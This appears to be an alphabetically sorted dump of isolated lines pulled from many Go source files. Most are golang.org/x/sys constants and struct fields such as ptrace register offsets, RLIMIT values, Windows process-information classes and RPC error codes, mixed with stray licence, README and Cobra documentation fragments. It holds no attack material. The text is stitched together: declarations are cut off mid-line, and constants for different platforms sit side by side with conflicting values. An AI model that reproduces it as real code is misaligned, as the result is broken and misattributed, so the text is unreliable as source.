PT_TEXT_ADDR                     = 0x10000
PT_TEXT_END_ADDR                 = 0x10008
PT_THUPDATE                             = 0xd
PT_TNPC                          = 0x90
PT_TPC                           = 0x88
PT_TRACE_ME                             = 0x0
PT_TRAP                          = 0x28
PT_TSTATE                        = 0x80
PT_V9_FP                         = 0x70
PT_V9_G0                         = 0x0
PT_V9_G1                         = 0x8
PT_V9_G2                         = 0x10
PT_V9_G3                         = 0x18
PT_V9_G4                         = 0x20
PT_V9_G5                         = 0x28
PT_V9_G6                         = 0x30
PT_V9_G7                         = 0x38
PT_V9_I0                         = 0x40
PT_V9_I1                         = 0x48
PT_V9_I2                         = 0x50
PT_V9_I3                         = 0x58
PT_V9_I4                         = 0x60
PT_V9_I5                         = 0x68
PT_V9_I6                         = 0x70
PT_V9_I7                         = 0x78
PT_V9_MAGIC                      = 0x9c
PT_V9_TNPC                       = 0x90
PT_V9_TPC                        = 0x88
PT_V9_TSTATE                     = 0x80
PT_V9_Y                          = 0x98
PT_VR0                           = 0x52
PT_VRSAVE                        = 0x94
PT_VSCR                          = 0x93
PT_VSR0                          = 0x96
PT_VSR31                         = 0xd4
PT_WIM                           = 0x10
PT_WRITE_D                              = 0x5
PT_WRITE_I                              = 0x4
PT_WRITE_U                              = 0x6
PT_XER                           = 0x25
PT_Y                             = 0xc
PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS
P_/ 
P_ALL                                       = 0x0
P_PGID                                      = 0x2
P_PID                                       = 0x1
P_PIDFD                                     = 0x3
P_acflag    uint16
P_addr      uintptr
P_comm      [17]byte
P_cpticks   int32
P_debugger  int32
P_dupfd     int32
P_estcpu    uint32
P_flag      int32
P_holdcnt   int32
P_iticks    uint64
P_nice      int8
P_oppid     int32
P_pctcpu    uint32
P_pgrp      uintptr
P_pid       int32
P_priority  uint8
P_realtimer Itimerval
P_refcnt int32
P_rgid   uint32
P_rtime     Timeval
P_ru        
P_ruid   uint32
P_sigacts   uintptr
P_sigcatch  uint32
P_sigignore uint32
P_siglist   int32
P_sigmask   uint32
P_slptime   uint32
P_starttime Timeval
P_stat      int8
P_sticks    uint64
P_svgid  uint32
P_svuid  uint32
P_swtime    uint32
P_textvp    uintptr
P_traceflag int32
P_tracep    uintptr
P_usrpri    uint8
P_uticks    uint64
P_vmspace   
P_wchan     
P_wmesg     
P_xstat     uint16
Package documentation can be found on
PackageDependencyData unsafe.Pointer
PacketMreq) error {
Packets      uint32
Packets uint32
Pad          uint16
Pad          uint32
Pad       uint16
Pad      uint16
Pad      uint32
Pad    [4]int64
Pad    int32
Pad    uint16
Pad    uint32
Pad    uint8
Pad   [64]uint8
Pad  [100]int8
Pad  [1012]uint8
Pad  [236]int8
Pad  [3]uint64
Pad  [92]int8
Pad  [96]int8
Pad  [96]uint8
Pad0       [3]int32
Pad0   uint8
Pad1       [3]uint32
Pad1      uint8
Pad1    [3]int32
Pad1    [3]uint32
Pad1    uint8
Pad1   uint16
Pad2       uint32
Pad2      uint16
Pad2    [3]int32
Pad2    [3]uint32
Pad2    uint16
Pad2    uint8
Pad3      uint32
Pad4    int32
Pad4    uint32
Pad5    [14]int32
PadFd  int32
Pad_cgo_0     [2]byte
Pad_cgo_0  [1]byte
Pad_cgo_0  [4]byte
Pad_cgo_0 [2]byte
Pad_cgo_0 [3]byte
Pad_cgo_0 [4]byte
Pad_cgo_0 [6]byte
Pad_cgo_1  [4]byte
Pad_cgo_1 [4]byte
Padding [13]uint64
Paddr   uintptr
Padto_ll uint32
PageFaultCount               uint32
PagefileUsage                uintptr
Pageins            int32
Pagemask           int32
Pageshift          int32
Pagesize           int32
Paging             int32
PanicOnError
Parameters CryptObjidBlob
ParentProcessID uint32
Parent_fd      int32
Parentdev    uint32
Parmlen      int16
Parmoffset   int32
ParseErrorsWhitelist ParseErrorsWhitelist
Parser {
Parser) Parse(reader io.Reader) error {
Parser) handleTag(name string) bool {
Parser{
PartitionId       uint16
Password       
PasswordLength uint32
Patent Claims
Path   [1023]uint8
Path   [104]int8
Path   [108]int8
Path   [UNIX_PATH_MAX]int8
Path   string
Path string
Path uint64 // the file server's unique identification for the file
Path: 
PathBuffer           [1]uint16
PathMax        = 0x1000
PathMax        = 0x3ff
PathMax        = 0x400
PathMax = 0x400
Pathlen      uint32
Paul Borman <borman@google.com>
Pause() (err error)
Pc     uint64
Pc  uint64
Pc_lock  [72]int8
Pc_ucred uintptr
Pcred   Pcred
Pdanscan           int32
Pdbusy             int32
Pddeact            int32
Pdfreed            int32
Pdobscan           int32
Pdpageouts         int32
Pdpending          int32
Pdreact            int32
Pdreanon           int32
Pdrevnode          int32
Pdrevs             int32
Pdrevtext          int32
Pdscans            int32
Pdswout            int32
Pdwoke             int32
PeakJobMemoryUsed     uintptr
PeakPagefileUsage            uintptr
PeakProcessMemoryUsed uintptr
PeakVirtualSize              uintptr
PeakWorkingSetSize           uintptr
PebBaseAddress               
Peer     uint32
Peer uint32
Pending uint8
PerJobUserTimeLimit     int64
PerProcessUserTimeLimit int64
Per_info                 PtracePer
Perc_atmid    uint16
PerfBitComm                          = CBitFieldMaskBit9
PerfBitCommExec                      = CBitFieldMaskBit24
PerfBitContextSwitch                 = CBitFieldMaskBit26
PerfBitDisabled               uint64 = CBitFieldMaskBit0
PerfBitEnableOnExec                  = CBitFieldMaskBit12
PerfBitExcludeCallchainKernel        = CBitFieldMaskBit21
PerfBitExcludeCallchainUser          = CBitFieldMaskBit22
PerfBitExcludeGuest                  = CBitFieldMaskBit20
PerfBitExcludeHost                   = CBitFieldMaskBit19
PerfBitExcludeHv                     = CBitFieldMaskBit6
PerfBitExcludeIdle                   = CBitFieldMaskBit7
PerfBitExcludeKernel                 = CBitFieldMaskBit5
PerfBitExcludeUser                   = CBitFieldMaskBit4
PerfBitExclusive                     = CBitFieldMaskBit3
PerfBitFreq                          = CBitFieldMaskBit10
PerfBitInherit                       = CBitFieldMaskBit1
PerfBitInheritStat                   = CBitFieldMaskBit11
PerfBitMmap                          = CBitFieldMaskBit8
PerfBitMmap2                         = CBitFieldMaskBit23
PerfBitMmapData                      = CBitFieldMaskBit17
PerfBitPinned                        = CBitFieldMaskBit2
PerfBitPreciseIPBit1                 = CBitFieldMaskBit15
PerfBitPreciseIPBit2                 = CBitFieldMaskBit16
PerfBitSampleIDAll                   = CBitFieldMaskBit18
PerfBitTask                          = CBitFieldMaskBit13
PerfBitUseClockID                    = CBitFieldMaskBit25
PerfBitWatermark                     = CBitFieldMaskBit14
PerfEventOpen(attr 
Perm       SysvIpcPerm
Perm   SysvIpcPerm
Permitted   uint32
Persistent
PersistentPostRun
PersistentPostRun func(cmd 
PersistentPostRunE func(cmd 
PersistentPreRun
PersistentPreRun func(cmd 
PersistentPreRunE func(cmd 
Person = Domain(0)
Pga_zerohit        int32
Pga_zeromiss       int32
Pgid    int32
Pgswapin           int32
Pgswapout          int32
Phase_seg1   uint32
Phase_seg2   uint32
PhysAddr        [MAXLEN_PHYSADDR]byte
PhysAddrLen     uint32
Physical    uint8
Physical   uint8
PhysicalAddress       [syscall.MAX_ADAPTER_ADDRESS_LENGTH]byte
PhysicalAddressLength uint32
Pid          int32
Pid       int32
Pid       uint32
Pid      int32
Pid     int32
Pid    int32
Pid    uint32
Pid   uint32
Pid  int
Pid int32
Pksent    uint64
Pksent   int64
Pksent   uint32
Pksent   uint64
Pkttype  uint8
PlatformId        uint32
Please note that CHANGELOG.md does not exist in the source code prior to this release.
Please read the [Contribution Guidelines](https://golang.org/doc/contribute.html)
Please refer to [Bash Completions](bash_completions.md) for details.
Please refer to [Shell Completions](shell_completions.md
Please refer to [Shell Completions](shell_completions.md) for details.
Please refer to [Zsh Completions](zsh_completions.md) for details.
Please specify the path to the chart to package
Pmc_width      uint16
Pmtu           uint32
Pno     int32
Policy [24]byte
PolicyCallbackData              uintptr
PolicyInfos 
Port      uint32
Port     uint16
Port    uint16
Port   int
Port   uint16
Port  TIPCSocketAddr
Port  uint32
Port int
Port uint32
PortEvent) {
Posmode    int32
Posmult int32
PostProcessInitRoutine uintptr
PostRun
PostRun func(cmd 
PostRunE func(cmd 
PowerShell:
Ppid    int32
Ppsfreq   int32
Ppsfreq   int64
PreRun
PreRun func(cmd 
PreRun: func(_ 
PreRunE func(cmd 
Precision int32
Precision int64
Prefered uint32
Preference   uint16
PreferredLifetime  uint32
PrefixLength uint32
PrefixOrigin       int32
Prefixlen uint8
PriClassBase    int32
PrimaryGroup 
PrimaryWinsServer   IpAddrString
Prime   int32
PrintDefaults()
PrintNameLength      uint16
PrintNameOffset      uint16
Priority uint16
Priority uint8
PriorityClass           uint32
Private int32
PrivatePageCount             uintptr
PrivilegeCount uint32
Privileges     [1]LUIDAndAttributes // Use AllPrivileges() for iterating.
Probes         uint8
Proc
Proc  ExternProc
Proc {
Proc) Addr() uintptr {
ProcThreadAttributeList
ProcThreadAttributeList 
ProcThreadAttributeList {
ProcThreadAttributeList) = DeleteProcThreadAttributeList
ProcThreadAttributeList) {
ProcThreadAttributeList)(unsafe.Pointer(alloc))}
ProcThreadAttributeListContainer) Delete() {
ProcThreadAttributeListContainer) List() 
ProcThreadAttributeListContainer{data: (
ProccntUsage uint32
Process   Handle
ProcessAccessToken
ProcessActivityThrottlePolicy
ProcessActivityThrottleState
ProcessAffinityMask
ProcessAffinityUpdateMode
ProcessAllowedCpuSetsInformation
ProcessAltSystemCallInformation
ProcessBasePriority
ProcessBasicInformation = iota
ProcessBreakOnTermination
ProcessCaptureTrustletLiveDump
ProcessCheckStackExtentsMode
ProcessChildProcessInformation
ProcessCombineSecurityDomainsInformation
ProcessCommandLineInformation
ProcessCommitReleaseInformation
ProcessConsoleHostProcess
ProcessCookie
ProcessCycleTime
ProcessDebugAuthInformation
ProcessDebugFlags
ProcessDebugObjectHandle
ProcessDebugPort
ProcessDefaultCpuSetsInformation
ProcessDefaultHardErrorMode
ProcessDeviceMap
ProcessDisableSystemAllowedCpuSets
ProcessDynamicEHContinuationTargets
ProcessDynamicEnforcedCetCompatibleRanges
ProcessDynamicFunctionTableInformation
ProcessEnableAlignmentFaultFixup
ProcessEnableLogging
ProcessEnableReadWriteVmLogging
ProcessEnclaveInformation
ProcessEnergyTrackingState
ProcessEnergyValues
ProcessEntry32) (err error) = kernel32.Process32FirstW
ProcessEntry32) (err error) = kernel32.Process32NextW
ProcessEntry32) (err error) {
ProcessExceptionPort
ProcessExecuteFlags
ProcessFaultInformation
ProcessFiberShadowStackAllocation
ProcessForegroundInformation
ProcessFreeFiberShadowStackAllocation
ProcessGroupId        uint32
ProcessGroupInformation
ProcessHandleCheckingMode
ProcessHandleCount
ProcessHandleInformation
ProcessHandleTable
ProcessHandleTracing
ProcessHighGraphicsPriorityInformation
ProcessID       uint32
ProcessID    uint32
ProcessId               uint32
ProcessId uint32
ProcessImageFileMapping
ProcessImageFileName
ProcessImageFileNameWin32
ProcessImageInformation
ProcessImageSection
ProcessInPrivate
ProcessInformation) (err error) = CreateProcessW
ProcessInformation) (err error) = advapi32.CreateProcessAsUserW
ProcessInformation) (err error) {
ProcessInstrumentationCallback
ProcessIoCounters
ProcessIoPortHandlers
ProcessIoPriority
ProcessIumChallengeResponse
ProcessJobMemoryInformation
ProcessKeepAliveCount
ProcessLUIDDeviceMapsEnabled
ProcessLdtInformation
ProcessLdtSize
ProcessLeapSecondInformation
ProcessLoaderDetour
ProcessManageWritesToExecutableMemory
ProcessMemoryAllocationMode
ProcessMemoryExhaustion
ProcessMemoryLimit    uintptr
ProcessMitigationPolicy
ProcessPagePriority
ProcessParameters      
ProcessPooledUsageAndLimits
ProcessPriorityBoost
ProcessPriorityClass
ProcessProtectionInformation
ProcessQuotaLimits
ProcessRaisePriority
ProcessRaiseUMExceptionOnInvalidHandleClose
ProcessRevokeFileHandles
ProcessSecurityDomainInformation
ProcessSequenceNumber
ProcessSessionInformation
ProcessSubsystemInformation
ProcessSubsystemProcess
ProcessSystemResourceManagement
ProcessTelemetryCoverage
ProcessTelemetryIdInformation
ProcessThreadStackAllocation
ProcessTimes
ProcessTlsInformation
ProcessTokenVirtualizationEnabled
ProcessUptimeInformation
ProcessUserModeIOPL
ProcessVmCounters
ProcessWakeInformation
ProcessWin32kSyscallFilterInformation
ProcessWindowInformation
ProcessWorkingSetControl
ProcessWorkingSetWatch
ProcessWorkingSetWatchEx
ProcessWow64Information
ProcessWx86Information
Procs     uint16
Proc{
Producer uint64
Product int16
ProductType       byte
ProductVersionLS uint32
ProductVersionMS uint32
Profhz  int32
Profhz int32
Prompt      
PromptFlags uint32
Prop_seg     uint32
Propagation uint64
Protect           uint32
Proto   
Proto   uint16
Protocol          int32
Protocol  int32
Protocol uint16
Protocol uint8
ProtocolChain     WSAProtocolChain
ProtocolMaxOffset int32
ProtocolName      [WSAPROTOCOL_LEN 
Protoent)(unsafe.Pointer(r0))
ProvFlags                       uint32
ProviderFlags     uint32
ProviderId        GUID
ProviderReserved  uint32
Psm         uint16
Pstate uint64
Psw                      PtracePsw
Ptr    
Ptr       uint64
Ptr    uint64
PtraceRegs) (err error) {
PtraceRegs) PC() uint32 { return r.Nip }
PtraceRegs) PC() uint64 { return r.Epc }
PtraceRegs) PC() uint64 { return r.Era }
PtraceRegs) PC() uint64 { return r.Nip }
PtraceRegs) PC() uint64 { return r.Pc }
PtraceRegs) PC() uint64 { return r.Psw.Addr }
PtraceRegs) PC() uint64 { return r.Rip }
PtraceRegs) PC() uint64 { return r.Tpc }
PtraceRegs) PC() uint64 { return uint64(r.Uregs[15]) }
PtraceRegs) PC() uint64 { return uint64(uint32(r.Eip)) }
PtraceRegs) SetPC(era uint64) { r.Era = era }
PtraceRegs) SetPC(pc uint32) { r.Nip = pc }
PtraceRegs) SetPC(pc uint64) { r.Eip = int32(pc) }
PtraceRegs) SetPC(pc uint64) { r.Epc = pc }
PtraceRegs) SetPC(pc uint64) { r.Nip = pc }
PtraceRegs) SetPC(pc uint64) { r.Pc = pc }
PtraceRegs) SetPC(pc uint64) { r.Psw.Addr = pc }
PtraceRegs) SetPC(pc uint64) { r.Rip = pc }
PtraceRegs) SetPC(pc uint64) { r.Tpc = pc }
PtraceRegs) SetPC(pc uint64) { r.Uregs[15] = uint32(pc) }
PtraceRegs386) error {
PtraceRegsAmd64) error {
PtraceRegsArm) error {
PtraceRegsArm64) error {
PtraceRegsMips) error {
PtraceRegsMips64) error {
PtraceRegsMips64le) error {
PtraceRegsMipsle) error {
Pty is a Go package for using unix pseudo-terminals.
PublicKey CryptBitBlob
PulseEvent(event Handle) (err error) = kernel32.PulseEvent
Q  [32][16]uint8
QNX4_SUPER_MAGIC                            = 0x2f
QNX6_SUPER_MAGIC                            = 0x68191122
QTAPPEND = 0x40
QTAUTH   = 0x08
QTDIR    = 0x80
QTEXCL   = 0x20
QTFILE   = 0x00
QTMOUNT  = 0x10
QTTMP    = 0x04
QUERY)$/ 
QUERYCVT                        = 3
QUOTA_LIMITS_HARDWS_MAX_DISABLE = 0x00000008
QUOTA_LIMITS_HARDWS_MAX_ENABLE  = 0x00000004
QUOTA_LIMITS_HARDWS_MIN_DISABLE = 0x00000002
QUOTA_LIMITS_HARDWS_MIN_ENABLE  = 0x00000001
Qid    Qid    // unique id from server
Qid: Qid{
Qspare  [2]int64
Qspare2 int64
Qualifiers      
QueryDosDevice(deviceName 
QueueID      uint32
Queue_depth    uint16
Queue_id       uint32
Quiesceowner [8]byte
QuotaNonPagedPoolUsage       uintptr
QuotaPagedPoolUsage          uintptr
QuotaPeakNonPagedPoolUsage   uintptr
QuotaPeakPagedPoolUsage      uintptr
R      [13]uint32
R10      uint64
R10    int64
R11      uint64
R11    int64
R12      uint64
R12    int64
R13      uint64
R13    int64
R14      uint64
R14    int64
R15      uint64
R15    int64
R8       uint64
R8     int64
R9       uint64
R9     int64
RAMFS_MAGIC                                 = 0x858458f6
RAW_PAYLOAD_/ 
RAW_PAYLOAD_DIGITAL                         = 0x3
RAW_PAYLOAD_HCI                             = 0x2
RAW_PAYLOAD_LLCP                            = 0x0
RAW_PAYLOAD_NCI                             = 0x1
RAW_PAYLOAD_PROPRIETARY                     = 0x4
RDTGROUP_SUPER_MAGIC                        = 0x7655821
READ
READ)$/ 
READ_CONTROL             = 0x00020000
REALTIME_PRIORITY_CLASS       = 0x00000100
REGDB_E_BADTHREADINGMODEL                                                 Handle        = 0x80040156
REGDB_E_CLASSNOTREG                                                       Handle        = 0x80040154
REGDB_E_FIRST                                                             syscall.Errno = 0x80040150
REGDB_E_IIDNOTREG                                                         Handle        = 0x80040155
REGDB_E_INVALIDVALUE                                                      Handle        = 0x80040153
REGDB_E_KEYMISSING                                                        Handle        = 0x80040152
REGDB_E_LAST                                                              syscall.Errno = 0x8004015F
REGDB_E_PACKAGEPOLICYVIOLATION                                            Handle        = 0x80040157
REGDB_E_READREGDB                                                         Handle        = 0x80040150
REGDB_E_WRITEREGDB                                                        Handle        = 0x80040151
REGDB_S_FIRST                                                             syscall.Errno = 0x00040150
REGDB_S_LAST                                                              syscall.Errno = 0x0004015F
REG_BINARY
REG_DWORD = REG_DWORD_LITTLE_ENDIAN
REG_DWORD_BIG_ENDIAN
REG_DWORD_LITTLE_ENDIAN
REG_EXPAND_SZ
REG_FULL_RESOURCE_DESCRIPTOR
REG_LINK
REG_MULTI_SZ
REG_NONE = iota
REG_NOTIFY_CHANGE_ATTRIBUTES = 0x00000002
REG_NOTIFY_CHANGE_LAST_SET = 0x00000004
REG_NOTIFY_CHANGE_NAME = 0x00000001
REG_NOTIFY_CHANGE_SECURITY = 0x00000008
REG_NOTIFY_THREAD_AGNOSTIC = 0x10000000
REG_QWORD = REG_QWORD_LITTLE_ENDIAN
REG_QWORD_LITTLE_ENDIAN
REG_RESOURCE_LIST
REG_RESOURCE_REQUIREMENTS_LIST
REG_SZ
REISERFS_SUPER_MAGIC                        = 0x52654973
RENAME/ 
RENAME_EXCHANGE                             = 0x2
RENAME_NOREPLACE                            = 0x1
RENAME_WHITEOUT                             = 0x4
REPLACE
REQKEY_DEFL)_/ 
RESOLVE_BENEATH       = 0x8
RESOLVE_IN_ROOT       = 0x10
RESOLVE_NO_MAGICLINKS = 0x2
RESOLVE_NO_SYMLINKS   = 0x4
RESOLVE_NO_XDEV       = 0x1
REVOKE_ACCESS     = 4
RFC4122                   // The variant specified in RFC4122
RFCENVG  = 1 << 11
RFCFDG   = 1 << 12
RFCNAMEG = 1 << 10
RFENVG   = 1 << 1
RFFDG    = 1 << 2
RFMEM    = 1 << 5
RFNAMEG  = 1 << 0
RFNOMNT  = 1 << 14
RFNOTEG  = 1 << 3
RFNOWAIT = 1 << 6
RFPROC   = 1 << 4
RFREND   = 1 << 13
RLIMIT_(AS
RLIMIT_AS                               = 0x5
RLIMIT_AS                         = 0xa
RLIMIT_AS                        = 0x6
RLIMIT_AS                        = 0x9
RLIMIT_AS                       = 5
RLIMIT_AS                      = 0xa
RLIMIT_AS                     = 0x6
RLIMIT_CORE                                 = 0x4
RLIMIT_CORE                             = 0x4
RLIMIT_CORE                       = 0x4
RLIMIT_CORE                     = 4
RLIMIT_CORE                    = 0x4
RLIMIT_CORE                   = 0x4
RLIMIT_CPU                                  = 0x0
RLIMIT_CPU                              = 0x0
RLIMIT_CPU                        = 0x0
RLIMIT_CPU                      = 0
RLIMIT_CPU                     = 0x0
RLIMIT_CPU                    = 0x0
RLIMIT_CPU_USAGE_MONITOR                = 0x2
RLIMIT_DATA                                 = 0x2
RLIMIT_DATA                             = 0x2
RLIMIT_DATA                       = 0x2
RLIMIT_DATA                     = 2
RLIMIT_DATA                    = 0x2
RLIMIT_DATA                   = 0x2
RLIMIT_FSIZE                                = 0x1
RLIMIT_FSIZE                            = 0x1
RLIMIT_FSIZE                      = 0x1
RLIMIT_FSIZE                    = 1
RLIMIT_FSIZE                   = 0x1
RLIMIT_FSIZE                  = 0x1
RLIMIT_LOCKS                                = 0xa
RLIMIT_MEMLIMIT                 = 7
RLIMIT_MEMLOCK                          = 0x6
RLIMIT_MEMLOCK                    = 0x6
RLIMIT_MEMLOCK                   = 0x8
RLIMIT_MEMLOCK                   = 0x9
RLIMIT_MEMLOCK                 = 0x6
RLIMIT_MSGQUEUE                             = 0xc
RLIMIT_NICE                                 = 0xd
RLIMIT_NOFILE                           = 0x8
RLIMIT_NOFILE                     = 0x8
RLIMIT_NOFILE                    = 0x5
RLIMIT_NOFILE                    = 0x6
RLIMIT_NOFILE                    = 0x7
RLIMIT_NOFILE                   = 6
RLIMIT_NOFILE                  = 0x8
RLIMIT_NOFILE                 = 0x5
RLIMIT_NOFILE                 = 0x7
RLIMIT_NPROC                            = 0x7
RLIMIT_NPROC                      = 0x7
RLIMIT_NPROC                     = 0x6
RLIMIT_NPROC                     = 0x7
RLIMIT_NPROC                     = 0x8
RLIMIT_NPROC                   = 0x7
RLIMIT_NPROC                  = 0x9
RLIMIT_RSS                              = 0x5
RLIMIT_RSS                        = 0x5
RLIMIT_RSS                       = 0x5
RLIMIT_RSS                       = 0x7
RLIMIT_RSS                     = 0x5
RLIMIT_RSS                    = 0x5
RLIMIT_RTPRIO                               = 0xe
RLIMIT_RTTIME                               = 0xf
RLIMIT_SIGPENDING                           = 0xb
RLIMIT_STACK                                = 0x3
RLIMIT_STACK                            = 0x3
RLIMIT_STACK                      = 0x3
RLIMIT_STACK                    = 3
RLIMIT_STACK                   = 0x3
RLIMIT_STACK                  = 0x3
RLIM_INFINITY                               = 0xffffffffffffffff
RLIM_INFINITY                           = 0x7fffffffffffffff
RLIM_INFINITY                     = 0x7fffffffffffffff
RLIM_INFINITY                   = 2147483647
RLIM_INFINITY                  = 0x7fffffffffffffff
RLIM_INFINITY                 = 0x7fffffff
RLIM_INFINITY                 = 0x7fffffffffffffff
RLIM_INFINITY                 = 0xfffffffffffffffd
RLIM_INFINITY/ 
RND/ 
RNDADDENTROPY                    = 0x40085203
RNDADDENTROPY                    = 0x80085203
RNDADDTOENTCNT                   = 0x40045201
RNDADDTOENTCNT                   = 0x80045201
RNDCLEARPOOL                     = 0x20005206
RNDCLEARPOOL                     = 0x5206
RNDGETENTCNT                     = 0x40045200
RNDGETENTCNT                     = 0x80045200
RNDGETPOOL                       = 0x40085202
RNDGETPOOL                       = 0x80085202
RNDRESEEDCRNG                    = 0x20005207
RNDRESEEDCRNG                    = 0x5207
RNDZAPENTCNT                     = 0x20005204
RNDZAPENTCNT                     = 0x5204
RO_E_BLOCKED_CROSS_ASTA_CALL                                              Handle        = 0x8000001F
RO_E_CANNOT_ACTIVATE_FULL_TRUST_SERVER                                    Handle        = 0x80000020
RO_E_CANNOT_ACTIVATE_UNIVERSAL_APPLICATION_SERVER                         Handle        = 0x80000021
RO_E_CHANGE_NOTIFICATION_IN_PROGRESS                                      Handle        = 0x80000015
RO_E_CLOSED                                                               Handle        = 0x80000013
RO_E_COMMITTED                                                            Handle        = 0x8000001E
RO_E_ERROR_STRING_NOT_FOUND                                               Handle        = 0x80000016
RO_E_EXCLUSIVE_WRITE                                                      Handle        = 0x80000014
RO_E_INVALID_METADATA_FILE                                                Handle        = 0x80000012
RO_E_METADATA_INVALID_TYPE_FORMAT                                         Handle        = 0x80000011
RO_E_METADATA_NAME_IS_NAMESPACE                                           Handle        = 0x80000010
RO_E_METADATA_NAME_NOT_FOUND                                              Handle        = 0x8000000F
RO_E_MUST_BE_AGILE                                                        Handle        = 0x8000001C
RO_E_UNSUPPORTED_FROM_MTA                                                 Handle        = 0x8000001D
RPC_E_ACCESS_DENIED                                                       Handle        = 0x8001011B
RPC_E_ATTEMPTED_MULTITHREAD                                               Handle        = 0x80010102
RPC_E_CALL_CANCELED                                                       Handle        = 0x80010002
RPC_E_CALL_COMPLETE                                                       Handle        = 0x80010117
RPC_E_CALL_REJECTED                                                       Handle        = 0x80010001
RPC_E_CANTCALLOUT_AGAIN                                                   Handle        = 0x80010011
RPC_E_CANTCALLOUT_INASYNCCALL                                             Handle        = 0x80010004
RPC_E_CANTCALLOUT_INEXTERNALCALL                                          Handle        = 0x80010005
RPC_E_CANTCALLOUT_ININPUTSYNCCALL                                         Handle        = 0x8001010D
RPC_E_CANTPOST_INSENDCALL                                                 Handle        = 0x80010003
RPC_E_CANTTRANSMIT_CALL                                                   Handle        = 0x8001000A
RPC_E_CHANGED_MODE                                                        Handle        = 0x80010106
RPC_E_CLIENT_CANTMARSHAL_DATA                                             Handle        = 0x8001000B
RPC_E_CLIENT_CANTUNMARSHAL_DATA                                           Handle        = 0x8001000C
RPC_E_CLIENT_DIED                                                         Handle        = 0x80010008
RPC_E_CONNECTION_TERMINATED                                               Handle        = 0x80010006
RPC_E_DISCONNECTED                                                        Handle        = 0x80010108
RPC_E_FAULT                                                               Handle        = 0x80010104
RPC_E_FULLSIC_REQUIRED                                                    Handle        = 0x80010121
RPC_E_INVALIDMETHOD                                                       Handle        = 0x80010107
RPC_E_INVALID_CALLDATA                                                    Handle        = 0x8001010C
RPC_E_INVALID_DATA                                                        Handle        = 0x8001000F
RPC_E_INVALID_DATAPACKET                                                  Handle        = 0x80010009
RPC_E_INVALID_EXTENSION                                                   Handle        = 0x80010112
RPC_E_INVALID_HEADER                                                      Handle        = 0x80010111
RPC_E_INVALID_IPID                                                        Handle        = 0x80010113
RPC_E_INVALID_OBJECT                                                      Handle        = 0x80010114
RPC_E_INVALID_OBJREF                                                      Handle        = 0x8001011D
RPC_E_INVALID_PARAMETER                                                   Handle        = 0x80010010
RPC_E_INVALID_STD_NAME                                                    Handle        = 0x80010122
RPC_E_NOT_REGISTERED                                                      Handle        = 0x80010103
RPC_E_NO_CONTEXT                                                          Handle        = 0x8001011E
RPC_E_NO_GOOD_SECURITY_PACKAGES                                           Handle        = 0x8001011A
RPC_E_NO_SYNC                                                             Handle        = 0x80010120
RPC_E_OUT_OF_RESOURCES                                                    Handle        = 0x80010101
RPC_E_REMOTE_DISABLED                                                     Handle        = 0x8001011C
RPC_E_RETRY                                                               Handle        = 0x80010109
RPC_E_SERVERCALL_REJECTED                                                 Handle        = 0x8001010B
RPC_E_SERVERCALL_RETRYLATER                                               Handle        = 0x8001010A
RPC_E_SERVERFAULT                                                         Handle        = 0x80010105
RPC_E_SERVER_CANTMARSHAL_DATA                                             Handle        = 0x8001000D
RPC_E_SERVER_CANTUNMARSHAL_DATA                                           Handle        = 0x8001000E
RPC_E_SERVER_DIED                                                         Handle        = 0x80010007
RPC_E_SERVER_DIED_DNE                                                     Handle        = 0x80010012
RPC_E_SYS_CALL_FAILED                                                     Handle        = 0x80010100
RPC_E_THREAD_NOT_INIT                                                     Handle        = 0x8001010F
RPC_E_TIMEOUT                                                             Handle        = 0x8001011F
RPC_E_TOO_LATE                                                            Handle        = 0x80010119
RPC_E_UNEXPECTED                                                          Handle        = 0x8001FFFF
RPC_E_UNSECURE_CALL                                                       Handle        = 0x80010118
RPC_E_VERSION_MISMATCH                                                    Handle        = 0x80010110
RPC_E_WRONG_THREAD                                                        Handle        = 0x8001010E
RPC_S_ADDRESS_ERROR                                                       syscall.Errno = 1768
RPC_S_ALREADY_LISTENING                                                   syscall.Errno = 1713
RPC_S_ALREADY_REGISTERED                                                  syscall.Errno = 1711
RPC_S_BINDING_HAS_NO_AUTH                                                 syscall.Errno = 1746
RPC_S_BINDING_INCOMPLETE                                                  syscall.Errno = 1819
RPC_S_CALLPENDING                                                         Handle        = 0x80010115
RPC_S_CALL_CANCELLED                                                      syscall.Errno = 1818
RPC_S_CALL_FAILED                                                         syscall.Errno = 1726
RPC_S_CALL_FAILED_DNE                                                     syscall.Errno = 1727
RPC_S_CALL_IN_PROGRESS                                                    syscall.Errno = 1791
RPC_S_CANNOT_SUPPORT                                                      syscall.Errno = 1764
RPC_S_CANT_CREATE_ENDPOINT                                                syscall.Errno = 1720
RPC_S_COMM_FAILURE                                                        syscall.Errno = 1820
RPC_S_COOKIE_AUTH_FAILED                                                  syscall.Errno = 1833
RPC_S_DO_NOT_DISTURB                                                      syscall.Errno = 1834
RPC_S_DUPLICATE_ENDPOINT                                                  syscall.Errno = 1740
RPC_S_ENTRY_ALREADY_EXISTS                                                syscall.Errno = 1760
RPC_S_ENTRY_NOT_FOUND                                                     syscall.Errno = 1761
RPC_S_ENTRY_TYPE_MISMATCH                                                 syscall.Errno = 1922
RPC_S_FP_DIV_ZERO                                                         syscall.Errno = 1769
RPC_S_FP_OVERFLOW                                                         syscall.Errno = 1771
RPC_S_FP_UNDERFLOW                                                        syscall.Errno = 1770
RPC_S_GROUP_MEMBER_NOT_FOUND                                              syscall.Errno = 1898
RPC_S_GRP_ELT_NOT_ADDED                                                   syscall.Errno = 1928
RPC_S_GRP_ELT_NOT_REMOVED                                                 syscall.Errno = 1929
RPC_S_INCOMPLETE_NAME                                                     syscall.Errno = 1755
RPC_S_INTERFACE_NOT_EXPORTED                                              syscall.Errno = 1924
RPC_S_INTERFACE_NOT_FOUND                                                 syscall.Errno = 1759
RPC_S_INTERNAL_ERROR                                                      syscall.Errno = 1766
RPC_S_INVALID_ASYNC_CALL                                                  syscall.Errno = 1915
RPC_S_INVALID_ASYNC_HANDLE                                                syscall.Errno = 1914
RPC_S_INVALID_AUTH_IDENTITY                                               syscall.Errno = 1749
RPC_S_INVALID_BINDING                                                     syscall.Errno = 1702
RPC_S_INVALID_BOUND                                                       syscall.Errno = 1734
RPC_S_INVALID_ENDPOINT_FORMAT                                             syscall.Errno = 1706
RPC_S_INVALID_NAF_ID                                                      syscall.Errno = 1763
RPC_S_INVALID_NAME_SYNTAX                                                 syscall.Errno = 1736
RPC_S_INVALID_NETWORK_OPTIONS                                             syscall.Errno = 1724
RPC_S_INVALID_NET_ADDR                                                    syscall.Errno = 1707
RPC_S_INVALID_OBJECT                                                      syscall.Errno = 1900
